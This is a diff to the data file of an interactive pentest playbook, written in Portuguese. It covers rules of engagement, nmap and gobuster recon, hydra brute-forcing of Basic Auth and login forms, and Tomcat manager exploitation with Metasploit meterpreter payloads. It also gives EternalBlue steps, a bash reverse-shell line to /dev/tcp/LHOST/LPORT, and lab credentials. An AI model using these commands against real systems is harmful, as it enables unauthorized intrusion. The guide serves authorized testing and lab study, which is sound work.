@@ -11,7 +11,7 @@ window.HUNTER_PLAYBOOK = {
 
   /* ordem do minimap */
   outline: [
-    { id: "roe", label: "RoE" },
+    { id: "roe", label: "Escopo" },
     { id: "session", label: "Sessão" },
     { id: "alive", label: "Alvo vivo?" },
     { id: "trio", label: "Trio recon" },
@@ -38,64 +38,69 @@ window.HUNTER_PLAYBOOK = {
     roe: {
       phase: "Briefing",
       title: "Antes de qualquer pacote",
-      say: "Bom. Vamos começar o pentest. Primeira pergunta não é técnica: tu está autorizado e o alvo está no escopo?",
-      tone: "danger",
+      say: "Pentest autorizado ou estudo controlado — escopo claro antes do primeiro pacote.",
       blocks: [
         {
-          title: "Checklist mínimo de engajamento",
+          title: "Checklist RoE",
           html: `<ul>
-            <li>Autorização escrita / RoE</li>
-            <li>In-scope e out-of-scope claros</li>
-            <li>Restrições (DoS, brute, horário, exploração destrutiva)</li>
-            <li>Contato de emergência do cliente</li>
-          </ul>
-          <p>Sem isso, não tem HUB. Tem processo crime.</p>`,
+            <li><strong>Scope</strong> — hosts, apps, contas, redes in-scope; o que está <em>excluído</em></li>
+            <li><strong>Targets</strong> — IPs/domínios/URLs confirmados (não “descobrir a empresa”)</li>
+            <li><strong>Allowed</strong> — enum, auth testing, exploit <em>dentro</em> do combinado</li>
+            <li><strong>Prohibited</strong> — DoS, fora de escopo, destrutivo sem OK explícito</li>
+            <li><strong>Evidence</strong> — prova mínima, timestamps, sem exfil massiva</li>
+            <li><strong>Lab (opcional)</strong> — se for THM/HTB/local, a box/VPN é o escopo; não é o default mental</li>
+          </ul>`,
         },
       ],
       choices: [
-        { label: "RoE ok — armar a sessão", hint: "Variáveis no bash, pasta de evidências", to: "session" },
-        { label: "Ainda não tenho autorização", hint: "Para aqui", to: "stop-roe" },
+        { label: "RoE ok — armar a sessão", hint: "Variáveis no bash", to: "session" },
+        { label: "Ainda sem escopo/alvo", hint: "Volta depois", to: "stop-roe" },
       ],
     },
 
     "stop-roe": {
-      phase: "Stop",
-      title: "Engajamento bloqueado",
-      say: "Fecha o guia. Resolve autorização. Volta quando tiver papel na mão.",
-      tone: "danger",
-      blocks: [],
+      phase: "Setup",
+      title: "Sem engajamento definido",
+      say: "Sem scope/targets não há próximo passo técnico. Define autorização + alvo e volta.",
+      blocks: [
+        {
+          title: "Mínimo pra recomeçar",
+          html: `<ul>
+            <li>Quem autorizou / qual janela</li>
+            <li>Lista in-scope (e exclusões)</li>
+            <li>Um target concreto (IP, URL ou app)</li>
+          </ul>`,
+        },
+      ],
       choices: [
-        { label: "Já resolvi — recomeçar", hint: "Volta ao briefing", to: "roe" },
+        { label: "Já tenho RoE — recomeçar", hint: "Volta ao briefing", to: "roe" },
       ],
     },
 
     session: {
       phase: "Setup",
       title: "Armar a sessão",
-      say: "Isso roda no terminal bash do Kali — o prompt kali@…:~$ — não dentro do msfconsole. O Metasploit só entra quando um ramo pedir.",
+      say: "Exports no bash. Metasploit só quando o ramo pedir.",
       blocks: [
         {
-          title: "Cola e ajusta os valores",
+          title: "Cola e ajusta",
           cmd: `export CLIENT="nome-do-cliente"
 export IP="IP_DO_ALVO"
 export DOMAIN="dominio.se.houver"
 export TARGET="http://$IP"
 export LHOST="TEU_IP_DE_ATAQUE"
 export LPORT="443"
-export NOTES="$HOME/engagements/$CLIENT-$(date +%Y%m%d)"
-mkdir -p "$NOTES"/{recon,evidence,requests,findings}
-cd "$NOTES"
-echo "Alvo: $IP | $TARGET" | tee recon/alvo.txt`,
+echo "Alvo: $IP | $TARGET | LHOST $LHOST:$LPORT"`,
           label: "bash",
-          why: "Variáveis de ambiente evitam IP errado no meio do engajamento. LPORT 443 é preferência de callback; se o egress do alvo bloquear, cai pra 4444 no ramo Shell.",
+          why: "Evita IP/LHOST errado nos cmds seguintes.",
         },
         {
           title: "Onde cada coisa vive",
           html: `<div class="table-wrap"><table>
             <tr><th>Ferramenta</th><th>Onde</th></tr>
             <tr><td>export, nmap, gobuster, curl, rlwrap nc</td><td>Terminal bash</td></tr>
-            <tr><td>use / set / run</td><td>msfconsole (depois)</td></tr>
-            <tr><td>Repeater / history</td><td>Burp Community</td></tr>
+            <tr><td>use / set / run / sessions</td><td>msfconsole</td></tr>
+            <tr><td>Proxy / Repeater / history</td><td>Burp Community</td></tr>
           </table></div>`,
         },
       ],
@@ -112,7 +117,7 @@ echo "Alvo: $IP | $TARGET" | tee recon/alvo.txt`,
         {
           title: "Checagem rápida",
           cmd: `ping -c 2 "$IP"
-curl -sI "$TARGET" | tee recon/headers.txt`,
+curl -sI "$TARGET"`,
           label: "bash",
         },
         {
@@ -138,7 +143,7 @@ curl -sI "$TARGET" | tee recon/headers.txt`,
         {
           title: "Checklist",
           html: `<ul>
-            <li><code>ip -4 addr show tun0</code> (VPN THM/HTB up?)</li>
+            <li><code>ip -4 addr show tun0</code> (VPN de lab/cliente up?)</li>
             <li>IP do room/cliente ainda válido?</li>
             <li>Ping no gateway da VPN</li>
             <li><code>TARGET</code> com esquema certo (http vs https)</li>
@@ -161,7 +166,7 @@ traceroute -n "$IP" | head`,
       blocks: [
         {
           title: "Dig (se houver domínio)",
-          cmd: `dig "$DOMAIN" ANY +noall +answer | tee recon/dig.txt
+          cmd: `dig "$DOMAIN" ANY +noall +answer
 dig "$DOMAIN" NS +short
 dig "$DOMAIN" MX +short
 dig "$DOMAIN" TXT +short`,
@@ -170,24 +175,24 @@ dig "$DOMAIN" TXT +short`,
         },
         {
           title: "Nmap — primeiro passe",
-          cmd: `nmap -sV -sC -oA recon/nmap_inicial "$IP"`,
+          cmd: `nmap -sV -sC "$IP"`,
           label: "bash",
-          why: "-sV = versão. -sC = scripts default. -oA = salva nos 3 formatos pra evidence.",
+          why: "-sV = versão. -sC = scripts default. Output no terminal; só usa -oA se for guardar evidência de verdade.",
         },
         {
           title: "Nmap — amplo (host único / janela ok)",
-          cmd: `nmap -sV -sC -p- --min-rate $NMAP_MINRATE -oA recon/nmap_full "$IP"`,
+          cmd: `nmap -sV -sC -p- --min-rate $NMAP_MINRATE "$IP"`,
           label: "bash",
         },
         {
           title: "Nmap — scripts vuln (opcional)",
-          cmd: `nmap --script vuln -sV -p PORTAS "$IP" -oA recon/nmap_vuln`,
+          cmd: `nmap --script vuln -sV -p PORTAS "$IP"`,
           label: "bash",
           why: "Barulhento e mais agressivo. Só com RoE ok — não é o primeiro pacote em produção sensível.",
         },
         {
           title: "Gobuster — cada HTTP",
-          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40 -o recon/gobuster.txt`,
+          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40`,
           label: "bash",
           why: "Wordlist tu escolhe por engajamento. Outra porta web (8080, 1234)? Repete o gobuster nela.",
         },
@@ -231,25 +236,28 @@ dig "$DOMAIN" TXT +short`,
     web: {
       phase: "Web",
       title: "Ramo Web",
-      say: "Beleza — tem HTTP(S). Trata como produto: mapeia, enumera, aí ataca. Não chuta exploit no escuro.",
+      say: "HTTP(S). Mapa → enum → ataque. 401 Basic / pasta protegida = Auth (não SQLi). Slowloris / CVE-2007-6750 do nmap vuln = ignora.",
       blocks: [
         {
           title: "1. Browser + Burp",
           html: `<ul>
             <li>Scope = hosts in-scope</li>
-            <li>Navega como usuário: home, login, register, busca, upload</li>
-            <li>Network → XHR/Fetch = API real</li>
-            <li>Anota inputs em <code>recon/surface.md</code></li>
+            <li>Home, links, login, busca, upload</li>
+            <li>Network → XHR/Fetch = API</li>
+            <li>Inputs → notas</li>
           </ul>`,
         },
         {
           title: "2. Gobuster nesta URL",
-          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40 -o recon/gobuster_web.txt
-curl -s "$TARGET/robots.txt"`,
+          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40
+curl -s "$TARGET/robots.txt"
+# 401? confirma Basic Auth:
+curl -sI "$TARGET/protected/"`,
           label: "bash",
+          why: "http-enum do nmap pode ter listado /protected/ (401). curl -I → WWW-Authenticate: Basic.",
         },
         {
-          title: "3. Parâmetro opaco → wfuzz",
+          title: "3. Parâmetro opaco → wfuzz (só se tiver endpoint)",
           cmd: `curl -s -o /dev/null -w '%{size_download}\\n' "$TARGET/endpoint?x=test"
 
 wfuzz -c -z file,$WORDLIST_PARAMS --hh TAMANHO_NORMAL \\
@@ -258,16 +266,24 @@ wfuzz -c -z file,$WORDLIST_PARAMS --hh TAMANHO_NORMAL \\
           why: "Ajusta --hh/--hc ao tamanho da resposta baseline. Diferença = param existe → Repeater.",
         },
         {
-          title: "4. SQLi (ponto já confirmado)",
-          cmd: `sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM
+          title: "4. SQLi (só com ponto já confirmado)",
+          cmd: `sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM
 # aprofundar:
-sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM`,
+sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM`,
           label: "bash",
+        },
+        {
+          title: "Não é foothold",
+          html: `<ul>
+            <li><strong>Slowloris / CVE-2007-6750</strong> e a lista vulners do Apache = DoS / CVE genérico. Em lab de foothold: <em>ignora</em> e segue o 401.</li>
+            <li>Tomcat em outra porta (ex. 1234) = volta ao mapa → Tomcat /manager.</li>
+          </ul>`,
         },
       ],
       choices: [
-        { label: "Tem login / auth", to: "web-auth" },
-        { label: "Tomcat /manager", to: "tomcat" },
+        { label: "401 / Basic Auth / pasta protegida", hint: "/protected/ · hydra http-get", to: "web-auth" },
+        { label: "Tem login form (POST)", to: "web-auth" },
+        { label: "Tomcat /manager (outra porta)", to: "tomcat" },
         { label: "RCE / upload — preciso de callback", to: "shell" },
         { label: "Provei impacto — reportar", to: "report" },
         { label: "Voltar ao mapa de portas", to: "ports" },
@@ -277,31 +293,55 @@ sqlmap -r requests/sqli.req $SQLMAP_OPTS -p $SQLMAP_PARAM`,
     "web-auth": {
       phase: "Web",
       title: "Ramo Auth",
-      say: "Auth é onde o dinheiro mora. Captura o POST no Burp antes de sair no hydra.",
+      say: "WWW-Authenticate: Basic → hydra http-get. Form POST → http-post-form. Cred ok → remapear app / Nuclei com Header Basic.",
       blocks: [
         {
-          title: "Manual (Repeater)",
+          title: "Basic Auth (pasta 401)",
+          cmd: `# confirma
+curl -sI "$TARGET/protected/"
+# deve ter: WWW-Authenticate: Basic …
+
+# brute curto primeiro — não rockyou × N users
+hydra -L $USERS -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt \\
+  -t $HYDRA_T -f "$IP" http-get /protected/
+
+# teste manual
+curl -sI -u 'USER:PASS' "$TARGET/protected/"`,
+          label: "bash",
+          why: "Path = o 401 real. 200 = sucesso. rockyou só com -l USER.",
+        },
+        {
+          title: "Entrei — atrás do 401",
+          cmd: `curl -s -u 'USER:PASS' "$TARGET/protected/" | head -n 80
+gobuster dir -u "$TARGET/protected/" -w $WORDLIST -t 40 -U USER -P PASS
+
+nuclei -u "$TARGET/protected/" \\
+  -H "Authorization: Basic $(echo -n 'USER:PASS' | base64 -w0)" \\
+  -t http/misconfiguration/ -t http/exposures/ -severity medium,high,critical`,
+          label: "bash",
+          why: "Mesmo user:pass no browser se pedir de novo.",
+        },
+        {
+          title: "Form login (POST) — Manual no Burp",
           html: `<ul>
+            <li>Captura o POST no Burp antes do hydra</li>
             <li>Página interna sem cookie?</li>
             <li>Cookie do user A na sessão B?</li>
-            <li><code>role=admin</code> / claims JWT adulteráveis?</li>
             <li>Erro diferencia user vs senha? (= enum)</li>
-            <li>SQLi no campo user — se quebrar, sqlmap no request</li>
+            <li>SQLi no campo user — se quebrar, ramo SQLi</li>
           </ul>`,
         },
         {
-          title: "Brute (RoE + rate)",
+          title: "Form login — Brute (RoE + rate)",
           cmd: `hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
   "$IP" http-post-form \\
-  "/login:email=^USER^&password=^PASS^:F=$HYDRA_FAIL"
-
-hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
-  "$IP" http-get /caminho/protegido`,
+  "/login:email=^USER^&password=^PASS^:F=$HYDRA_FAIL"`,
           label: "bash",
           why: "A string F= tem que bater com a mensagem de falha real do app (olha no Burp).",
         },
       ],
       choices: [
+        { label: "Entrei — Nuclei autenticado", hint: "Header Basic", to: "nuclei" },
         { label: "Entrei — remapear app autenticado", to: "web" },
         { label: "Cred/bypass = finding", to: "report" },
         { label: "Mapa de portas", to: "ports" },
@@ -311,41 +351,86 @@ hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
     tomcat: {
       phase: "Web",
       title: "Ramo Tomcat",
-      say: "Manager exposto + cred fraca = caminho clássico. Aqui o msfconsole entra de verdade.",
+      say: "Versão: banner do nmap -sV (Tomcat/x.y.z, Coyote). Nikto só se o lab pedir 'documents'. Cred no /manager/html → msf tomcat_mgr_upload.",
       blocks: [
         {
-          title: "Achar manager",
-          cmd: `gobuster dir -u "http://$IP:PORTA/" -w $WORDLIST -t 40
-curl -sI "http://$IP:PORTA/manager/html"`,
+          title: "Ler o que o nmap já spitou",
+          html: `<ul>
+            <li><code>Apache Tomcat/Coyote JSP engine 1.1</code> + header <code>Apache-Coyote/1.1</code> → Coyote</li>
+            <li><code>http-title: Apache Tomcat/7.0.88</code> → server version (formato ******/x.y.z)</li>
+            <li>Porta do manager = a do Tomcat (ex. 1234), não a 80</li>
+            <li>Não roda Nikto/curl só pra “descobrir versão” se o -sV já mostrou</li>
+          </ul>`,
+        },
+        {
+          title: "Achar / confirmar manager",
+          cmd: `curl -sI "http://$IP:PORTA/manager/html"
+# 401 = Basic Auth no manager → hydra ou cred reusada do /protected/`,
           label: "bash",
         },
         {
-          title: "Brute no manager (RoE)",
-          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
-  "$IP" -s PORTA http-get /manager/html`,
+          title: "Brute no manager (RoE) — se ainda sem cred",
+          cmd: `hydra -L $USERS -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt \\
+  -t $HYDRA_T -f "$IP" -s PORTA http-get /manager/html`,
+          label: "bash",
+          why: "Se já tem user:pass de outro 401 (ex. /protected/), testa antes: curl -sI -u 'USER:PASS' http://$IP:PORTA/manager/html",
+        },
+        {
+          title: "Só se o lab exigir 'How many documents'",
+          cmd: `nikto -h "http://$IP:$RPORT/manager/html" -id 'USER:PASS'
+# rodapé: documentation files → quiz`,
           label: "bash",
         },
         {
-          title: "Metasploit",
+          title: "Cred no manager?",
+          cmd: `curl -sI -u 'USER:PASS' "http://$IP:$RPORT/manager/html"
+# 200 = ok → MSF. 401 = cred errada / role sem manager-gui`,
+          label: "bash",
+          why: "ToolsRUs: bob:bubbles. RPORT = porta Tomcat (params).",
+        },
+        {
+          title: "msfconsole",
           cmd: `msfconsole -q`,
           label: "bash → msf",
         },
         {
-          title: "Dentro do msf",
-          cmd: `search tomcat_mgr
+          title: "tomcat_mgr_upload",
+          cmd: `search tomcat_mgr_upload
 use exploit/multi/http/tomcat_mgr_upload
-set RHOSTS IP_DO_ALVO
-set RPORT PORTA
+show options
+
+set RHOSTS $IP
+set RPORT $RPORT
 set HttpUsername USER
 set HttpPassword PASS
-set LHOST TEU_LHOST
+set LHOST $LHOST
+set LPORT $LPORT
+
+# Linux box típica:
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+# se falhar, tenta:
+# set PAYLOAD java/meterpreter/reverse_tcp
+# set PAYLOAD linux/x86/meterpreter/reverse_tcp
+
+show options
 run`,
           label: "msfconsole",
+          why: "HttpUsername/Password = manager. Sem set RPORT certo (ex. 1234) o módulo bate na 80 e morre.",
+        },
+        {
+          title: "Sessão caiu / falhou",
+          html: `<ul>
+            <li><code>LHOST</code> = tun0 (VPN), não eth0</li>
+            <li>Payload errado pra arch → troca java/linux x86/x64</li>
+            <li><code>sessions -l</code> / <code>sessions -i N</code></li>
+            <li>Handler manual: ver ramo Metasploit</li>
+          </ul>`,
         },
       ],
       choices: [
-        { label: "Sessão/shell caiu", to: "shell" },
-        { label: "Reportar acesso ao manager", to: "report" },
+        { label: "Metasploit (hub)", to: "msf" },
+        { label: "Sessão/shell", to: "shell" },
+        { label: "Reportar manager", to: "report" },
         { label: "Mapa de portas", to: "ports" },
       ],
     },
@@ -354,12 +439,12 @@ run`,
     smb: {
       phase: "Rede",
       title: "Ramo SMB (445 / 139)",
-      say: "Enum primeiro. Exploit depois. EternalBlue não é o passo 1 — é o passo quando o OS grita idade.",
+      say: "Enum antes de exploit. EternalBlue só com OS velho (SMBv1 / Win7 / 2008).",
       blocks: [
         {
           title: "Enum",
           cmd: `nmap -sV -p 139,445 --script smb-os-discovery,smb-security-mode,smb-enum-shares \\
-  "$IP" -oA recon/nmap_smb
+  "$IP"
 
 smbclient -L "//$IP/" -N`,
           label: "bash",
@@ -368,7 +453,7 @@ smbclient -L "//$IP/" -N`,
           title: "Stack velho? EternalBlue (RoE!)",
           cmd: `msfconsole -q`,
           label: "bash → msf",
-          why: "Win7 / Server 2008 / SMBv1 são o cheiro clássico. Confirma autorização — é exploração pesada.",
+          why: "Win7 / Server 2008 / SMBv1. Exploit pesado — confere escopo.",
         },
         {
           title: "No msf",
@@ -395,7 +480,7 @@ run`,
       blocks: [
         {
           title: "Versão + brute (RoE)",
-          cmd: `nmap -sV -p 22 -oA recon/nmap_ssh "$IP"
+          cmd: `nmap -sV -p 22 "$IP"
 hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f ssh://"$IP"
 ssh user@"$IP"`,
           label: "bash",
@@ -414,7 +499,7 @@ ssh user@"$IP"`,
       blocks: [
         {
           title: "Checagem",
-          cmd: `nmap -sV -p 21 --script ftp-anon,ftp-syst -oA recon/nmap_ftp "$IP"
+          cmd: `nmap -sV -p 21 --script ftp-anon,ftp-syst "$IP"
 ftp "$IP"
 # user: anonymous
 # pass: anonymous@`,
@@ -436,7 +521,7 @@ ftp "$IP"
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info -oA recon/nmap_rdp "$IP"`,
+          cmd: `nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info "$IP"`,
           label: "bash",
         },
         {
@@ -458,8 +543,7 @@ ftp "$IP"
       blocks: [
         {
           title: "Enum + login",
-          cmd: `nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-enum \\
-  -oA recon/nmap_mysql "$IP"
+          cmd: `nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-enum \\ "$IP"
 mysql -h "$IP" -u root -p`,
           label: "bash",
         },
@@ -483,8 +567,7 @@ mysql -h "$IP" -u root -p`,
       blocks: [
         {
           title: "Enum",
-          cmd: `nmap -sV -p 1433 --script ms-sql-info,ms-sql-empty-password \\
-  -oA recon/nmap_mssql "$IP"
+          cmd: `nmap -sV -p 1433 --script ms-sql-info,ms-sql-empty-password \\ "$IP"
 msfconsole -q
 search mssql`,
           label: "bash / msf",
@@ -505,8 +588,7 @@ search mssql`,
         {
           title: "Enum",
           cmd: `nmap -sV -p 25,587 --script smtp-commands,smtp-enum-users \\
-  --script-args smtp-enum-users.methods=VRFY \\
-  -oA recon/nmap_smtp "$IP"`,
+  --script-args smtp-enum-users.methods=VRFY \\ "$IP"`,
           label: "bash",
         },
       ],
@@ -522,23 +604,21 @@ search mssql`,
     shell: {
       phase: "Foothold",
       title: "Listener e shell",
-      say: "Listener antes do payload. Sempre. rlwrap nc no bash — a menos que o handler seja do próprio msf.",
+      say: "Listener antes do payload. nc no bash; se o exploit foi MSF, usa a sessão/handler do msf.",
       blocks: [
         {
-          title: "1. Ouve",
-          cmd: `rlwrap nc -lvnp "$LPORT"
-# preferência: 443
-# fallback: export LPORT=4444`,
+          title: "1. nc (fora do msf)",
+          cmd: `rlwrap nc -lvnp "$LPORT"`,
           label: "bash",
         },
         {
-          title: "2. Callback (exemplo Linux)",
+          title: "2. Callback Linux (exemplo)",
           cmd: `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`,
           label: "alvo",
-          why: "O vetor real é o que tu explorou (cmdi, upload, msf). Isto é só o formato clássico de reverse.",
+          why: "O vetor real é o exploit (cmdi, upload, msf). Isto é só o formato do reverse.",
         },
         {
-          title: "3. TTY utilizável",
+          title: "3. TTY",
           cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'
 # no nc: Ctrl-Z
 stty raw -echo; fg
@@ -547,13 +627,26 @@ export TERM=xterm`,
           label: "bash",
         },
         {
-          title: "4. Evidência mínima",
+          title: "4. Meterpreter (se veio do msf)",
+          cmd: `sessions -l
+sessions -i 1
+getuid
+sysinfo
+shell
+# volta: exit / background
+`,
+          label: "msfconsole",
+        },
+        {
+          title: "5. Evidência mínima",
           cmd: `id
-hostname`,
+hostname
+pwd`,
           label: "shell",
         },
       ],
       choices: [
+        { label: "Metasploit (hub)", to: "msf" },
         { label: "Documentar acesso", to: "report" },
         { label: "Ainda há portas no nmap", to: "ports" },
       ],
@@ -562,27 +655,27 @@ hostname`,
     report: {
       phase: "Entrega",
       title: "Escrever o finding",
-      say: "Achado sem escrito não existe pro cliente. Fecha o pacote e volta ao mapa se ainda houver superfície.",
+      say: "Escreve o finding. Se sobrar superfície, volta ao mapa.",
       blocks: [
         {
           title: "Template",
-          cmd: `# [Critical|High|Medium|Low|Info] Título com impacto
+          cmd: `# [Critical|High|Medium|Low|Info] Título
 
 **Asset:** URL / host / porta
-**Como achou:** nmap → smb → msf / burp → idor / …
+**Como achou:** nmap → … / burp → …
 
 ## Resumo
 2 frases.
 
 ## Impacto
-O que o atacante faz no negócio.
+O que o atacante faz.
 
 ## Repro
 1. …
 2. …
 
 ## Evidência
-evidence/…
+(print / nota)
 
 ## Correção
 Controle objetivo.`,
